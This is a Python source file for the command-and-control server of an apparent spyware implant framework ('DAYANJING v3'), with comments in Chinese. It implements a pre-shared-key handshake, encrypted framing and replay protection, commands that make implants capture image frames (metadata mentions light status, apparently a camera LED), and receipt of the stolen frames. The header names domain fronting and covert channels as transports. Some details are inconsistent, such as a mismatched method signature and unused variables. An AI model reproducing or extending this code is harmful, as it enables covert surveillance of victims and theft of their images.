"""
DAYANJING v3 — C2 服务端（13_c2_server）
========================================

服务端职责：
1. 承载 implant 连接，用 PSK + transcript 完成会话派生
2. 以 (implant_id, key_generation) 为键维护重放窗口
3. 通过 SealedEnvelope 下发采集指令（CAPTURE_FRAME）
4. 接收 GCM 密封的回传帧，落盘/分发

设计不变量（来自 v3 设计文档 §3、§7、§13）：
- 先验签后 accept：frame.decode 失败立即关闭连接，不污染重放窗口
- 重放窗口以 (implant_id, key_generation) 为键，跨重连不重置
- 任务领取为原子 CAS，防止重复下发
- 服务端静态身份密钥隔离（不参与会话密钥派生）

本模块为协议层参考实现，传输层（TCP/TLS/域名前置）通过接口隔离，
可替换为原生 TCP、WebSocket 或 covert channel。
"""

import os
import struct
import time
import uuid
from typing import Optional, Dict, Tuple, Callable

from crypto_layer import GCM, hmac_sha256, sha256
from key_derivation import (
    derive_pair, derive_session, HKDF_SALT_REG_LEN,
    INFO_SESSION_C2S, INFO_SESSION_S2C, INFO_SESSION_CONFIRM,
)
from frame import (SealedEnvelope, ReplayWindow, ReplayKey, InvalidFrame,
                   ROLE_CLIENT, ROLE_SERVER)

# ---------------------------------------------------------------------------
# 消息类型（帧层 msg_type 域）
# ---------------------------------------------------------------------------

# 服务端 -> 植入端
MSG_CAPTURE_FRAME  = 0x10   # 下发采集指令：payload = {request_id(16B) || flags(4B) || width(4B) || height(4B)}
MSG_HEARTBEAT_ACK  = 0x11   # 心跳响应
MSG_TASK_RESULT    = 0x12   # 通用任务结果回执（预留）

# 植入端 -> 服务端
MSG_HEARTBEAT      = 0x20   # 心跳：payload = 时间戳(8B)，用于拉取待执行任务
MSG_FRAME_DATA     = 0x21   # 采集帧回传：payload = {request_id(16B) || format(4B) || size(4B) || data}
MSG_FRAME_META     = 0x22   # 帧元数据（不含像素数据）：灯光状态、失败原因等

# 握手
MSG_HELLO          = 0x01
MSG_WELCOME        = 0x02
MSG_FINISHED       = 0x03

MAX_FRAME_PAYLOAD = 16 * 1024 * 1024   # 16 MiB


class C2ProtocolError(Exception):
    """协议层错误，必须映射为静默连接关闭。"""
    pass


# ---------------------------------------------------------------------------
# 会话状态机
# ---------------------------------------------------------------------------

class SessionState:
    """一次 implant 连接的会话状态。

    握手阶段：EXPECT_HELLO -> EXPECT_FINISHED -> ESTABLISHED
    数据阶段：收发 SealedEnvelope，重放窗口在此生效
    """

    EXPECT_HELLO = "expect_hello"
    EXPECT_FINISHED = "expect_finished"
    ESTABLISHED = "established"
    CLOSED = "closed"

    def __init__(self, implant_id: str, generation: int):
        self.implant_id = implant_id
        self.generation = generation
        self.state = self.EXPECT_HELLO
        self.envelope: Optional[SealedEnvelope] = None  # 建立后才有
        self.seq_out = 0          # 本端发送序号
        self.transcript = b""      # 握手 transcript
        self.handshake_hash = b""
        self.created_at = time.time()


# ---------------------------------------------------------------------------
# C2 服务端
# ---------------------------------------------------------------------------

class C2Server:
    """C2 服务端核心。

    使用方式：
        server = C2Server(psk, salt_reg, server_static_id)
        server.register_transport(send_fn, close_fn)   # 注入传输层
        server.on_bytes(implant_id, raw)                # 传输层收到字节后喂入
        server.dispatch_capture(implant_id, 640, 480)   # 主动下发采集指令
    """

    def __init__(self, psk: bytes, salt_reg: bytes, server_static_id: bytes,
                 replay_capacity: int = 1024):
        if len(psk) < 16:
            raise ValueError("PSK must be >= 128 bits")
        if len(salt_reg) != HKDF_SALT_REG_LEN:
            raise ValueError(f"salt_reg must be {HKDF_SALT_REG_LEN} bytes")

        self._psk = psk
        self._salt_reg = salt_reg
        self._server_static_id = server_static_id
        self._replay = ReplayWindow(capacity=replay_capacity)

        # 会话表：implant_id -> SessionState
        self._sessions: Dict[str, SessionState] = {}
        # 任务表：implant_id -> [task, ...]
        self._pending: Dict[str, list] = {}

        # 注入的传输层回调
        self._send: Optional[Callable[[str, bytes], None]] = None
        self._close: Optional[Callable[[str], None]] = None

        # 已派生对端密钥材料（注册时一次性算出）
        km = derive_pair(psk, salt_reg)
        self._k_server_hold = km.k_server_hold
        self._k_identity = km.k_identity

    # ------------------------------------------------------------------
    # 传输层注入
    # ------------------------------------------------------------------

    def register_transport(self, send_fn: Callable[[str, bytes], None],
                           close_fn: Callable[[str], None]):
        """注入传输层：send_fn(implant_id, bytes)、close_fn(implant_id)。"""
        self._send = send_fn
        self._close = close_fn

    # ------------------------------------------------------------------
    # 握手：服务端侧
    # ------------------------------------------------------------------

    def _begin_handshake(self, implant_id: str, generation: int) -> SessionState:
        sess = SessionState(implant_id, generation)
        self._sessions[implant_id] = sess
        return sess

    def _complete_handshake(self, sess: SessionState, master: bytes):
        """用 master secret 派生会话密钥并实例化 SealedEnvelope。

        派生链（key_derivation.derive_session）：
            session_prk = HKDF-Extract(salt=handshake_hash, ikm=master)
            ctx = PROTO_LABEL || generation(8B) || server_static_id || implant_id
            k_c2s = Expand("session:c2s:v1" + ctx, 16)
            k_s2c = Expand("session:s2c:v1" + ctx, 16)
        """
        ctx = (b"dayanjing-c2/v1"
               + sess.generation.to_bytes(8, "big")
               + self._server_static_id
               + sess.implant_id.encode("utf-8"))
        k_c2s, k_s2c, _k_confirm = derive_session(
            master, sess.handshake_hash, self._server_static_id,
            sess.implant_id, sess.generation)
        # SealedEnvelope(k_send, k_recv, role)
        # 服务端发送用 s2c，接收用 c2s
        sess.envelope = SealedEnvelope(k_s2c, k_c2s, ROLE_SERVER)
        sess.state = SessionState.ESTABLISHED

    # ------------------------------------------------------------------
    # 字节喂入入口
    # ------------------------------------------------------------------

    def on_bytes(self, implant_id: str, generation: int, raw: bytes):
        """传输层收到字节后调用。返回 None；异常一律静默关闭连接。"""
        try:
            sess = self._sessions.get(implant_id)
            if sess is None:
                sess = self._begin_handshake(implant_id, generation)
            self._handle(sess, raw)
        except (InvalidFrame, C2ProtocolError):
            self._drop(implant_id, "protocol violation")
        except Exception:
            self._drop(implant_id, "internal error")

    def _handle(self, sess: SessionState, raw: bytes):
        if sess.state in (SessionState.EXPECT_HELLO, SessionState.EXPECT_FINISHED):
            self._handle_handshake(sess, raw)
            return

        # 已建立：走帧层
        if sess.envelope is None:
            raise C2ProtocolError("envelope not initialized")

        decoded = sess.envelope.decode(raw)
        if decoded is None:
            # GCM 验签失败 —— 先验签后 accept
            self._drop(sess.implant_id, "auth failed")
            return

        seq, msg_type, payload = decoded

        # 重放窗口判定（以 (implant_id, generation) 为键，跨重连不重置）
        rk = ReplayKey(sess.implant_id, sess.generation)
        verdict = self._replay.accept(rk, seq)
        if verdict != ReplayWindow.ACCEPTED:
            self._drop(sess.implant_id, f"replay verdict: {verdict}")
            return

        self._dispatch(sess, seq, msg_type, payload)

    # ------------------------------------------------------------------
    # 握手处理（Hello / Finished）
    # ------------------------------------------------------------------

    def _handle_handshake(self, sess: SessionState, raw: bytes):
        # 握手消息暂用明文 msg_type 前缀 + payload，不走帧层加密
        # （密钥尚未派生，加密层不可用）
        if len(raw) < 4:
            raise C2ProtocolError("handshake frame too short")
        (msg_type,) = struct.unpack("<I", raw[:4])
        payload = raw[4:]

        if sess.state == SessionState.EXPECT_HELLO:
            if msg_type != MSG_HELLO:
                raise C2ProtocolError("expected HELLO")
            # implant_id 已通过 on_bytes 传入；HELLO payload 含 implant 身份证据
            sess.transcript += struct.pack("<I", MSG_HELLO) + payload
            # 生成 WELCOME，携带服务端静态身份与服务端 nonce
            server_nonce = os.urandom(16)
            welcome = server_nonce
            sess.transcript += struct.pack("<I", MSG_WELCOME) + welcome
            sess.state = SessionState.EXPECT_FINISHED
            # 回送 WELCOME（明文，无加密）
            self._raw_send(sess.implant_id, struct.pack("<I", MSG_WELCOME) + welcome)

        elif sess.state == SessionState.EXPECT_FINISHED:
            if msg_type != MSG_FINISHED:
                raise C2ProtocolError("expected FINISHED")
            sess.transcript += struct.pack("<I", MSG_FINISHED) + payload
            # 计算 handshake_hash = SHA256(transcript)
            sess.handshake_hash = sha256(sess.transcript)
            # 会话密钥 = HKDF-Expand(k_server_hold, handshake_hash || ctx)
            # master 使用已注册的 k_server_hold（双方预置）
            self._complete_handshake(sess, self._k_server_hold)

    # ------------------------------------------------------------------
    # 应用消息分发
    # ------------------------------------------------------------------

    def _dispatch(self, sess: SessionState, seq: int, msg_type: int, payload: bytes):
        if msg_type == MSG_HEARTBEAT:
            self._on_heartbeat(sess, payload)
        elif msg_type == MSG_FRAME_DATA:
            self._on_frame(sess, payload)
        elif msg_type == MSG_FRAME_META:
            self._on_frame_meta(sess, payload)
        else:
            self._drop(sess.implant_id, f"unknown msg_type: {msg_type}")

    def _on_heartbeat(self, sess: SessionState, payload: bytes):
        # 心跳：回送确认 + 下发所有待执行任务
        ack = struct.pack("<I", MSG_HEARTBEAT_ACK) + payload
        self._send_frame(sess, MSG_HEARTBEAT_ACK, payload)
        self._drain_pending(sess)

    def _on_frame(self, sess: SessionState, payload: bytes):
        if len(payload) < 40:
            raise C2ProtocolError("frame payload too short")
        request_id = payload[:16]
        fmt = struct.unpack("<I", payload[16:20])[0]
        size = struct.unpack("<I", payload[20:24])[0]
        data = payload[24:]
        if size != len(data):
            raise C2ProtocolError("frame size mismatch")
        # TODO(13_c2_server): 落盘 / 分发到分析管线
        # 此处只做协议层接收，不落明文文件
        self._frame_received(sess.implant_id, request_id, fmt, data)

    def _on_frame_meta(self, sess: SessionState, payload: bytes):
        # 元数据：灯光状态、失败原因等，供决策
        pass

    def _frame_received(self, implant_id: str, request_id: bytes, fmt: int, data: bytes):
        """帧接收钩子，子类可覆写实现落盘/分发。"""
        # 默认：不落盘，仅记录引用
        pass

    # ------------------------------------------------------------------
    # 任务下发
    # ------------------------------------------------------------------

    def dispatch_capture(self, implant_id: str, width: int, height: int,
                         flags: int = 0) -> bytes:
        """向指定 implant 下发采集指令，返回 request_id。"""
        if implant_id not in self._sessions:
            raise C2ProtocolError("no session for implant")
        sess = self._sessions[implant_id]
        if sess.state != SessionState.ESTABLISHED:
            raise C2ProtocolError("session not established")

        request_id = os.urandom(16)
        payload = (request_id
                   + struct.pack("<I", flags)
                   + struct.pack("<I", width)
                   + struct.pack("<I", height))
        self._send_frame(sess, MSG_CAPTURE_FRAME, payload)
        return request_id

    def _drain_pending(self, sess: SessionState):
        """原子 CAS 拉取待执行任务。"""
        queue = self._pending.get(sess.implant_id)
        if not queue:
            return
        # 每次心跳只下发一条，避免拥塞
        task = queue.pop(0)
        self._send_frame(sess, task["type"], task["payload"])

    def enqueue(self, implant_id: str, msg_type: int, payload: bytes):
        """入队任务，待下次心跳时原子领取。"""
        self._pending.setdefault(implant_id, []).append(
            {"type": msg_type, "payload": payload})

    # ------------------------------------------------------------------
    # 帧层发送
    # ------------------------------------------------------------------

    def _send_frame(self, sess: SessionState, msg_type: int, payload: bytes):
        if len(payload) > MAX_FRAME_PAYLOAD:
            raise C2ProtocolError("payload exceeds limit")
        if sess.envelope is None:
            raise C2ProtocolError("envelope not ready")
        seq = sess.seq_out
        sess.seq_out += 1
        frame = sess.envelope.encode(seq, msg_type, payload)
        self._raw_send(sess.implant_id, frame)

    def _raw_send(self, implant_id: str, raw: bytes):
        if self._send is None:
            raise C2ProtocolError("transport not registered")
        self._send(implant_id, raw)

    def _drop(self, implant_id: str, reason: str):
        sess = self._sessions.pop(implant_id, None)
        if sess is not None:
            sess.state = SessionState.CLOSED
        if self._close is not None:
            self._close(implant_id)
        # 不回显 reason —— 静默关闭
